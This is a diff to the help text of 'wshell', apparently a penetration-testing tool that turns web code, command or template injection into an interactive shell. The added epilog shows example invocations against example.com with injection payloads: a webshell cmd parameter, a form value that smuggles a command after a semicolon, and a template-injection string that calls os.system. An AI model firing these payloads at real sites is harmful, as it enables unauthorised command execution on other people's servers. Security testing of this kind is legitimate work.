@@ -3,6 +3,7 @@ import os
 import random
 import re
 import sys
+import textwrap
 from typing import List, Union
 
 import requests
@@ -29,8 +30,17 @@ def main(args: List[Union[str, bytes]] = sys.argv) -> ExitStatus:
 
     parser = argparse.ArgumentParser(
         prog="wshell",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
         description="Turn a web-based {code,command,template} injection in a full featured shell with ease",
-        epilog='For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT',
+        epilog=textwrap.dedent('''
+            For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT
+
+            Example usage:
+
+                wshell 'https://www.example.com/webshell?cmd=^CMD^'
+                wshell --form 'https://www.example.com/command-injection' 'p=;^CMD^ #'
+                wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("^CMD^")}'
+        '''),
         add_help=True,
         allow_abbrev=False
     )
